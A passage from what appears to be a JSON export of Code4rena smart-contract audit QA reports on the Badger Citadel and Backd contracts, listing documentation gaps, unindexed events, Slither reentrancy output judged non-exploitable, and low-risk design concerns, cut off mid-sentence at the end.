src/interfaces/citadel/ICitadelToken.sol (line [0](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/interfaces/citadel/ICitadelToken.sol#L0))\r\n```solidity\r\n// SPDX-License-Identifier: MIT\r\n```\r\n8. File: src/interfaces/citadel/IGac.sol (line [0](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/interfaces/citadel/IGac.sol#L0))\r\n```solidity\r\n/// SPDX-License-Identifier: MIT\r\n```\r\n9. File: src/interfaces/citadel/IMedianOracle.sol (line [0](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/interfaces/citadel/IMedianOracle.sol#L0))\r\n```solidity\r\n/// SPDX-License-Identifier: MIT\r\n```\r\n10. File: src/interfaces/citadel/IStakedCitadelLocker.sol (line [0](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/interfaces/citadel/IStakedCitadelLocker.sol#L0))\r\n```solidity\r\n// SPDX-License-Identifier: MIT\r\n```\r\n11. File: src/interfaces/citadel/ISupplySchedule.sol (line [0](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/interfaces/citadel/ISupplySchedule.sol#L0))\r\n```solidity\r\n// SPDX-License-Identifier: MIT\r\n```\r\n12. File: src/interfaces/citadel/IVesting.sol (line [0](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/interfaces/citadel/IVesting.sol#L0))\r\n```solidity\r\n// SPDX-License-Identifier: MIT\r\n```\r\n13. File: src/interfaces/convex/IRewardStaking.sol (line [0](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/interfaces/convex/IRewardStaking.sol#L0))\r\n```solidity\r\n// SPDX-License-Identifier: MIT\r\n```\r\n14. File: src/interfaces/convex/IStakingProxy.sol (line [0](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/interfaces/convex/IStakingProxy.sol#L0))\r\n```solidity\r\n// SPDX-License-Identifier: MIT\r\n```\r\n\r\n### NatSpec is incorrect\r\nWrong parameter description\r\n1. File: src/Funding.sol (line [160](https://github.com/code-423n4/2022-04-badger-citadel/blob/18f8c392b6fc303fe95602eba6303725023e53da/src/Funding.sol#L160))\r\n```solidity\r\n     * @param _minCitadelOut ID of DAO to vote for\r\n```\r\n\r\n\r\n### NatSpec is incomplete\r\n\r\n1. File: src/Funding.sol (lines [95-112](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/Funding.sol#L95-L112))\r\n```solidity\r\n    /**\r\n     * @notice Initializer.\r\n     * @param _gac Global access control\r\n     * @param _citadel The token this contract will return in a trade\r\n     * @param _asset The token this contract will receive in a trade\r\n     * @param _xCitadel Staked citadel, citadel will be granted to funders in this form\r\n     * @param _saleRecipient The address receiving the proceeds of the sale - will be citadel multisig\r\n     * @param _assetCap The max asset that the contract can take\r\n     */\r\n    function initialize(\r\n        address _gac,\r\n        address _citadel,\r\n        address _asset,\r\n        address _xCitadel,\r\n        address _saleRecipient,\r\n        address _citadelPriceInAssetOracle,\r\n        uint256 _assetCap\r\n    ) external initializer {\r\n```\r\nMissing: `@param _citadelPriceInAssetOracle`\r\n\r\n2. File: src/KnightingRound.sol (lines [98-119](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/KnightingRound.sol#L98-L119))\r\n```solidity\r\n    /**\r\n     * @notice Initializer.\r\n     * @param _tokenOut The token this contract will return in a trade (citadel)\r\n     * @param _tokenIn The token this contract will receive in a trade\r\n     * @param _saleStart The time when tokens can be first purchased\r\n     * @param _saleDuration The duration of the token sale\r\n     * @param _tokenOutPrice The tokenOut per tokenIn price\r\n     * @param _saleRecipient The address receiving the proceeds of the sale - will be citadel multisig\r\n     * @param _guestlist Address that will manage auction approvals\r\n     * @param _tokenInLimit The max tokenIn that the contract can take\r\n     */\r\n    function initialize(\r\n        address _globalAccessControl,\r\n        address _tokenOut,\r\n        address _tokenIn,\r\n        uint256 _saleStart,\r\n        uint256 _saleDuration,\r\n        uint256 _tokenOutPrice,\r\n        address _saleRecipient,\r\n        address _guestlist,\r\n        uint256 _tokenInLimit\r\n    ) external initializer {\r\n```\r\nMissing: `@param _globalAccessControl`\r\n\r\n3. File: src/StakedCitadel.sol (lines [154-179](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadel.sol#L154-L179))\r\n```solidity\r\n    /// @notice Initializes the Sett. Can only be called once, ideally when the contract is deployed.\r\n    /// @param _token Address of the token that can be deposited into the sett.\r\n    /// @param _governance Address authorized as governance.\r\n    /// @param _keeper Address authorized as keeper.\r\n    /// @param _guardian Address authorized as guardian.\r\n    /// @param _treasury Address to distribute governance fees/rewards to.\r\n    /// @param _strategist Address authorized as strategist.\r\n    /// @param _badgerTree Address of badgerTree used for emissions.\r\n    /// @param _name Specify a custom sett name. Leave empty for default value.\r\n    /// @param _symbol Specify a custom sett symbol. Leave empty for default value.\r\n    /// @param _feeConfig Values for the 4 different types of fees charges by the sett\r\n    ///         [performanceFeeGovernance, performanceFeeStrategist, withdrawToVault, managementFee]\r\n    ///         Each fee should be less than the constant hard-caps defined above.\r\n    function initialize(\r\n        address _token,\r\n        address _governance,\r\n        address _keeper,\r\n        address _guardian,\r\n        address _treasury,\r\n        address _strategist,\r\n        address _badgerTree,\r\n        address _vesting,\r\n        string memory _name,\r\n        string memory _symbol,\r\n        uint256[4] memory _feeConfig\r\n    ) public initializer whenNotPaused {\r\n```\r\nMissing: `@param _vesting`\r\n\r\n4. File: src/StakedCitadel.sol (lines [357-367](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadel.sol#L357-L367))\r\n```solidity\r\n    /// @notice Deposits `_amount` tokens, issuing shares to `recipient`.\r\n    ///         Checks the guestlist to verify that `recipient` is authorized to make a deposit for the specified `_amount`.\r\n    ///         Note that deposits are not accepted when the Sett is paused or when `pausedDeposit` is true.\r\n    /// @dev See `_depositForWithAuthorization` for details on guestlist authorization.\r\n    /// @param _recipient Address to issue the Sett shares to.\r\n    /// @param _amount Quantity of tokens to deposit.\r\n    function depositFor(\r\n        address _recipient,\r\n        uint256 _amount,\r\n        bytes32[] memory proof\r\n    ) external whenNotPaused {\r\n```\r\nMissing: `@param proof`\r\n\r\n\r\n### Event is missing `indexed` fields\r\nEach `event` should use three `indexed` fields if there are three or more fields\r\n\r\n1. File: external/MedianOracle.sol (line [35](https://github.com/ampleforth/market-oracle/blob/5e7fd1506784f074748ab6bd5df740ca2227b14f/contracts/MedianOracle.sol#L35))\r\n```solidity\r\n    event ProviderAdded(address provider);\r\n```\r\n2. File: external/MedianOracle.sol (line [36](https://github.com/ampleforth/market-oracle/blob/5e7fd1506784f074748ab6bd5df740ca2227b14f/contracts/MedianOracle.sol#L36))\r\n```solidity\r\n    event ProviderRemoved(address provider);\r\n```\r\n3. File: external/MedianOracle.sol (line [37](https://github.com/ampleforth/market-oracle/blob/5e7fd1506784f074748ab6bd5df740ca2227b14f/contracts/MedianOracle.sol#L37))\r\n```solidity\r\n    event ReportTimestampOutOfRange(address provider);\r\n```\r\n4. File: external/MedianOracle.sol (line [38](https://github.com/ampleforth/market-oracle/blob/5e7fd1506784f074748ab6bd5df740ca2227b14f/contracts/MedianOracle.sol#L38))\r\n```solidity\r\n    event ProviderReportPushed(address indexed provider, uint256 payload, uint256 timestamp);\r\n```\r\n5. File: external/StakedCitadelLocker.sol (line [853](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L853))\r\n```solidity\r\n    event RewardAdded(address indexed _token, uint256 _reward);\r\n```\r\n6. File: external/StakedCitadelLocker.sol (line [854](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L854))\r\n```solidity\r\n    event Staked(address indexed _user, uint256 indexed _epoch, uint256 _paidAmount, uint256 _lockedAmount, uint256 _boostedAmount);\r\n```\r\n7. File: external/StakedCitadelLocker.sol (line [855](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L855))\r\n```solidity\r\n    event Withdrawn(address indexed _user, uint256 _amount, bool _relocked);\r\n```\r\n8. File: external/StakedCitadelLocker.sol (line [856](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L856))\r\n```solidity\r\n    event KickReward(address indexed _user, address indexed _kicked, uint256 _reward);\r\n```\r\n9. File: external/StakedCitadelLocker.sol (line [857](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L857))\r\n```solidity\r\n    event RewardPaid(address indexed _user, address indexed _rewardsToken, uint256 _reward);\r\n```\r\n10. File: external/StakedCitadelLocker.sol (line [858](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L858))\r\n```solidity\r\n    event Recovered(address _token, uint256 _amount);\r\n```\r\n11. File: src/CitadelMinter.sol (lines [56-60](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/CitadelMinter.sol#L56-L60))\r\n```solidity\r\n    event FundingPoolWeightSet(\r\n        address pool,\r\n        uint256 weight,\r\n        uint256 totalFundingPoolWeight\r\n    );\r\n```\r\n12. File: src/CitadelMinter.sol (lines [61-65](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/CitadelMinter.sol#L61-L65))\r\n```solidity\r\n    event CitadelDistributionSplitSet(\r\n        uint256 fundingBps,\r\n        uint256 stakingBps,\r\n        uint256 lockingBps\r\n    );\r\n```\r\n13. File: src/CitadelMinter.sol (lines [66-70](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/CitadelMinter.sol#L66-L70))\r\n```solidity\r\n    event CitadelDistribution(\r\n        uint256 fundingAmount,\r\n        uint256 stakingAmount,\r\n        uint256 lockingAmount\r\n    );\r\n```\r\n14. File: src/CitadelMinter.sol (lines [72-76](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/CitadelMinter.sol#L72-L76))\r\n```solidity\r\n    event CitadelDistributionToFunding(\r\n        uint256 startTime,\r\n        uint256 endTime,\r\n        uint256 citadelAmount\r\n    );\r\n```\r\n15. File: src/CitadelMinter.sol (lines [77-82](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/CitadelMinter.sol#L77-L82))\r\n```solidity\r\n    event CitadelDistributionToFundingPool(\r\n        uint256 startTime,\r\n        uint256 endTime,\r\n        address pool,\r\n        uint256 citadelAmount\r\n    );\r\n```\r\n16. File: src/CitadelMinter.sol (lines [83-87](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/CitadelMinter.sol#L83-L87))\r\n```solidity\r\n    event CitadelDistributionToStaking(\r\n        uint256 startTime,\r\n        uint256 endTime,\r\n        uint256 citadelAmount\r\n    );\r\n```\r\n17. File: src/CitadelMinter.sol (lines [88-93](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/CitadelMinter.sol#L88-L93))\r\n```solidity\r\n    event CitadelDistributionToLocking(\r\n        uint256 startTime,\r\n        uint256 endTime,\r\n        uint256 citadelAmount,\r\n        uint256 xCitadelAmount\r\n    );\r\n```\r\n18. File: src/Funding.sol (lines [62-66](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/Funding.sol#L62-L66))\r\n```solidity\r\n    event Deposit(\r\n        address indexed buyer,\r\n        uint256 assetIn,\r\n        uint256 citadelOutValue\r\n    );\r\n```\r\n19. File: src/Funding.sol (line [68](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/Funding.sol#L68))\r\n```solidity\r\n    event CitadelPriceInAssetUpdated(uint256 citadelPrice);\r\n```\r\n20. File: src/Funding.sol (line [70](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/Funding.sol#L70))\r\n```solidity\r\n    event CitadelPriceBoundsSet(uint256 minPrice, uint256 maxPrice);\r\n```\r\n21. File: src/Funding.sol (line [71](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/Funding.sol#L71))\r\n```solidity\r\n    event CitadelPriceFlag(uint256 price, uint256 minPrice, uint256 maxPrice);\r\n```\r\n22. File: src/Funding.sol (line [74](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/Funding.sol#L74))\r\n```solidity\r\n    event AssetCapUpdated(uint256 assetCap);\r\n```\r\n23. File: src/Funding.sol (line [76](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/Funding.sol#L76))\r\n```solidity\r\n    event Sweep(address indexed token, uint256 amount);\r\n```\r\n24. File: src/Funding.sol (line [77](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/Funding.sol#L77))\r\n```solidity\r\n    event ClaimToTreasury(address indexed token, uint256 amount);\r\n```\r\n25. File: src/Funding.sol (line [87](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/Funding.sol#L87))\r\n```solidity\r\n    event DiscountLimitsSet(uint256 minDiscount, uint256 maxDiscount);\r\n```\r\n26. File: src/Funding.sol (line [88](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/Funding.sol#L88))\r\n```solidity\r\n    event DiscountSet(uint256 discount);\r\n```\r\n27. File: src/Funding.sol (line [89](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/Funding.sol#L89))\r\n```solidity\r\n    event DiscountManagerSet(address discountManager);\r\n```\r\n28. File: src/interfaces/erc20/IERC20.sol (line [85](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/interfaces/erc20/IERC20.sol#L85))\r\n```solidity\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n```\r\n29. File: src/interfaces/erc20/IERC20.sol (lines [91-95](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/interfaces/erc20/IERC20.sol#L91-L95))\r\n```solidity\r\n    event Approval(\r\n        address indexed owner,\r\n        address indexed spender,\r\n        uint256 value\r\n    );\r\n```\r\n30. File: src/KnightingRound.sol (lines [76-81](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/KnightingRound.sol#L76-L81))\r\n```solidity\r\n    event Sale(\r\n        address indexed buyer,\r\n        uint8 indexed daoId,\r\n        uint256 amountIn,\r\n        uint256 amountOut\r\n    );\r\n```\r\n31. File: src/KnightingRound.sol (line [82](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/KnightingRound.sol#L82))\r\n```solidity\r\n    event Claim(address indexed claimer, uint256 amount);\r\n```\r\n32. File: src/KnightingRound.sol (line [85](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/KnightingRound.sol#L85))\r\n```solidity\r\n    event SaleStartUpdated(uint256 saleStart);\r\n```\r\n33. File: src/KnightingRound.sol (line [86](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/KnightingRound.sol#L86))\r\n```solidity\r\n    event SaleDurationUpdated(uint256 saleDuration);\r\n```\r\n34. File: src/KnightingRound.sol (line [87](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/KnightingRound.sol#L87))\r\n```solidity\r\n    event TokenOutPriceUpdated(uint256 tokenOutPrice);\r\n```\r\n35. File: src/KnightingRound.sol (line [90](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/KnightingRound.sol#L90))\r\n```solidity\r\n    event TokenInLimitUpdated(uint256 tokenInLimit);\r\n```\r\n36. File: src/KnightingRound.sol (line [92](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/KnightingRound.sol#L92))\r\n```solidity\r\n    event Sweep(address indexed token, uint256 amount);\r\n```\r\n37. File: src/StakedCitadel.sol (lines [122-127](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadel.sol#L122-L127))\r\n```solidity\r\n    event TreeDistribution(\r\n        address indexed token,\r\n        uint256 amount,\r\n        uint256 indexed blockNumber,\r\n        uint256 timestamp\r\n    );\r\n```\r\n38. File: src/StakedCitadel.sol (lines [130-135](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadel.sol#L130-L135))\r\n```solidity\r\n    event Harvested(\r\n        address indexed token,\r\n        uint256 amount,\r\n        uint256 indexed blockNumber,\r\n        uint256 timestamp\r\n    );\r\n```\r\n39. File: src/StakedCitadel.sol (line [139](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadel.sol#L139))\r\n```solidity\r\n    event SetToEarnBps(uint256 newEarnToBps);\r\n```\r\n40. File: src/StakedCitadel.sol (line [140](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadel.sol#L140))\r\n```solidity\r\n    event SetMaxWithdrawalFee(uint256 newMaxWithdrawalFee);\r\n```\r\n41. File: src/StakedCitadel.sol (line [141](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadel.sol#L141))\r\n```solidity\r\n    event SetMaxPerformanceFee(uint256 newMaxPerformanceFee);\r\n```\r\n42. File: src/StakedCitadel.sol (line [142](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadel.sol#L142))\r\n```solidity\r\n    event SetMaxManagementFee(uint256 newMaxManagementFee);\r\n```\r\n43. File: src/StakedCitadel.sol (line [146](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadel.sol#L146))\r\n```solidity\r\n    event SetWithdrawalFee(uint256 newWithdrawalFee);\r\n```\r\n44. File: src/StakedCitadel.sol (line [147](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadel.sol#L147))\r\n```solidity\r\n    event SetPerformanceFeeStrategist(uint256 newPerformanceFeeStrategist);\r\n```\r\n45. File: src/StakedCitadel.sol (line [148](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadel.sol#L148))\r\n```solidity\r\n    event SetPerformanceFeeGovernance(uint256 newPerformanceFeeGovernance);\r\n```\r\n46. File: src/StakedCitadel.sol (line [149](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadel.sol#L149))\r\n```solidity\r\n    event SetManagementFee(uint256 newManagementFee);\r\n```\r\n47. File: src/StakedCitadelVester.sol (lines [41-46](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadelVester.sol#L41-L46))\r\n```solidity\r\n    event Vest(\r\n        address indexed recipient,\r\n        uint256 _amount,\r\n        uint256 _unlockBegin,\r\n        uint256 _unlockEnd\r\n    );\r\n```\r\n48. File: src/StakedCitadelVester.sol (lines [47-51](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadelVester.sol#L47-L51))\r\n```solidity\r\n    event Claimed(\r\n        address indexed owner,\r\n        address indexed recipient,\r\n        uint256 amount\r\n    );\r\n```\r\n49. File: src/StakedCitadelVester.sol (line [53](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadelVester.sol#L53))\r\n```solidity\r\n    event SetVestingDuration(uint256 duration);\r\n```\r\n50. File: src/SupplySchedule.sol (line [36](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/SupplySchedule.sol#L36))\r\n```solidity\r\n    event MintingStartTimeSet(uint256 globalStartTimestamp);\r\n```\r\n51. File: src/SupplySchedule.sol (line [37](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/SupplySchedule.sol#L37))\r\n```solidity\r\n    event EpochSupplyRateSet(uint256 epoch, uint256 rate);\r\n```\r\n\r\n### Non-exploitable reentrancies\r\n```\r\nReentrancy in CitadelMinter.mintAndDistribute() (src/CitadelMinter.sol#169-243):\r\nExternal calls:\r\n- citadelToken.mint(address(this),mintable) (src/CitadelMinter.sol#178-180)\r\n- IVault(cachedXCitadel).deposit(lockingAmount) (src/CitadelMinter.sol#195-197)\r\n- xCitadelLocker.notifyRewardAmount(address(cachedXCitadel),xCitadelToLockers) (src/CitadelMinter.sol#201-205)\r\n- IERC20Upgradeable(address(citadelToken)).safeTransfer(address(cachedXCitadel),stakingAmount) (src/CitadelMinter.sol#217-218)\r\n- _transferToFundingPools(fundingAmount) (src/CitadelMinter.sol#230-231)\r\n- returndata = address(token).functionCall(data,SafeERC20: low-level call failed) (node_modules/@openzeppelin/contracts-upgradeable/token/ERC20/utils/SafeERC20Upgradeable.sol#93)\r\n- (success,returndata) = target.call{value: value}(data) (node_modules/@openzeppelin/contracts-upgradeable/utils/AddressUpgradeable.sol#137)\r\n- IERC20Upgradeable(address(citadelToken)).safeTransfer(pool,amount) (src/CitadelMinter.sol#351-353)\r\nExternal calls sending eth:\r\n- _transferToFundingPools(fundingAmount) (src/CitadelMinter.sol#230-231)\r\n- (success,returndata) = target.call{value: value}(data) (node_modules/@openzeppelin/contracts-upgradeable/utils/AddressUpgradeable.sol#137)\r\nState variables written after the call(s):\r\n- lastMintTimestamp = block.timestamp (src/CitadelMinter.sol#240-241)\r\n```\r\n```\r\nReentrancy in StakedCitadel._withdraw(uint256) (src/StakedCitadel.sol#808-840):\r\nExternal calls:\r\n- IStrategy(strategy).withdraw(_toWithdraw) (src/StakedCitadel.sol#818-819)\r\n- IVesting(vesting).setupVesting(msg.sender,_amount,block.timestamp) (src/StakedCitadel.sol#830-831)\r\n- token.safeTransfer(vesting,_amount) (src/StakedCitadel.sol#831-833)\r\nState variables written after the call(s):\r\n- _mintSharesFor(treasury,_fee,balance() - _fee) (src/StakedCitadel.sol#836-837)\r\n- _balances[account] += amount (node_modules/@openzeppelin/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol#268)\r\n- _mintSharesFor(treasury,_fee,balance() - _fee) (src/StakedCitadel.sol#836-837)\r\n- _totalSupply += amount (node_modules/@openzeppelin/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol#267)\r\n```\r\n```\r\nReentrancy in StakedCitadel._depositFor(address,uint256) (src/StakedCitadel.sol#764-779):\r\nExternal calls:\r\n- token.safeTransferFrom(msg.sender,address(this),_amount) (src/StakedCitadel.sol#774-775)\r\nState variables written after the call(s):\r\n- _mintSharesFor(_recipient,_after - _before,_pool) (src/StakedCitadel.sol#776-777)\r\n- _balances[account] += amount (node_modules/@openzeppelin/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol#268)\r\n- _mintSharesFor(_recipient,_after - _before,_pool) (src/StakedCitadel.sol#776-777)\r\n- _totalSupply += amount (node_modules/@openzeppelin/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol#267)\r\nReentrancy in Funding.updateCitadelPriceInAsset() (src/Funding.sol#414-443):\r\nExternal calls:\r\n- (_citadelPriceInAsset,_valid) = IMedianOracle(citadelPriceInAssetOracle).getData() (src/Funding.sol#422-423)\r\nState variables written after the call(s):\r\n- citadelPriceFlag = true (src/Funding.sol#431-432)\r\n- citadelPriceInAsset = _citadelPriceInAsset (src/Funding.sol#438-439)\r\n```",
    "dataSource": {
      "name": "code-423n4/2022-04-badger-citadel-findings",
      "repo": "https://github.com/code-423n4/2022-04-badger-citadel-findings",
      "url": "https://github.com/code-423n4/2022-04-badger-citadel-findings/issues/180"
    }
  },
  {
    "title": "QA Report",
    "body": "# QA Report\n\n## Remarks/Recommendations\n\n- The test suite was a joy to work with\n- functions and data types could have had more documentation in places\n\n## Low Risk: No `removeStakerVault` function provided\n\nAt some point in the future a particular token may be found to be vulnerable to some kind of attack, or not behave in a reasonable manner. It should be possible to remove a Staker Vault in these circumstances. At present there is no way to remove a staker vault, only add them.\n\n## Low Risk: Reentrancy possible in `execute` but appears non-exploitable\n\nReentrancy is possible on [line 727](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L727) of function `execute` because ETH is transfered. An attacker can point the `beneficiary` parameter to a smart contract with a `receive()` function implemented which can call back into _backd_ contracts.\n\nIt does not seem that this reentrancy can be exploited since no state changes occur after the transfer of ETH. However, I have limited experience as an auditor and thought it would be best to point it out.\n\n## Low Risk: Don't use `safeApprove` in `TopUpLibrary.sol`\n\nThere are multiple uses of `safeApprove` in `TopAction.sol`. It has similar issues to `approve` where careful transaction ordering by an attacker could lead to uses of the old and the new allowance.\n\nOpenZeppelin have _deprecated_ this function [here](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/2bd75a44bb5f419d132bdca6f1bf483d1479f550/contracts/token/ERC20/utils/SafeERC20.sol#L38-L58). A deeper discussion of the issue can be found in this [GitHub Issue](https://github.com/OpenZeppelin/openzeppelin-contracts/issues/2219).\n\n## Low Risk: Functions which use `Preparable.execute` can be called by anyone\n\nA number of functions in the code base indirectly call `Preparable.execute` but can be executed by anyone. I'll refer to this family of functions as `execute*`. This appears pretty safe since calls to `prepare` and `reset` are all permissioned.\n\nI have not found an attack vector but I worry that it might be possible for an attacker to selectively order several contract calls, interspersing them with calls to `execute*` to gain some kind of advantage. The deadlines set by `prepare` are publicly viewable so the following example is feasible:\n\nExample:\n- wait until deadline has passed\n- perform contract call that uses old state\n- call `execute*`\n- perform contract call that uses new state, presumably to some advantage\n\nThe way to mitigate this problem would be to make `execute*` functions permissioned. The permission could be less restricive that requiring `GOVERNANCE` or `CONTROLLER` permissions, but more restrictive than allowing anyone on the Ethereum network.\n\n## Non critical: `AddressProvider.addStakerVault` can only return `true` or revert\n\nFunction [AddressProvider.addStakerVault](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/AddressProvider.sol#L277-L293) can only return `true` or revert.\nWhy return a boolean value at all if `false` can never be returned?\n\n## Non-critical: Documentation of `TopUpAction._calcExchangeAmount`\n\nThe documentation for [_calcExchangeAmount](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L70-L72) uses the term \"underlying\" but does not mention the parameter `actionToken`. Perhaps the documentation could be clarified?\n\n\n## Non-critical: `TopUpActionLibrary.lockFunds` needs documentation\n\nFunction [lockFunds](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L36-L68) spans 32 lines but has no documentation. It's a complicated function and probably deserves some.\n\n## Non-critical: No documentation for each field of structs in `TopUpAction`\n\nIt would be very helpful if [structs](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/interfaces/actions/topup/ITopUpAction.sol#L8-L49) `RecordKey`, `RecordMeta`, `Record` and `RecordMeta` had more detailed documentation, preferably on a field by field basis.\n\n## Non-critical: Inaccurate documentation on `TopUpAction.register`\n\nThe documentation for function [register](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L203-L254) is inaccurate.\n\nIt reads:\n\n```sol\n/**\n * @notice Register a top up action.\n * @dev The `depositAmount` must be greater or equal to the `totalTopUpAmount` (which is denominated in `actionToken`).\n * @param account Account to be topped up (first 20 bytes will typically be the address).\n * @param depositAmount Amount of `depositToken` that will be locked.\n * @param protocol Protocol which holds position to be topped up.\n * @param record containing the data for the position to register\n */\n```\n\nIt states that `depositAmount` is \"Amount of `depositToken` that will be locked\" but this is not completely accurate. The actual amount locked is in `record.totalTopUpAmount`. The amount locked will be equal to `record.totalTopAmount` (but denominated in the the deposit token).\n\nThis is demonstrated in your tests one 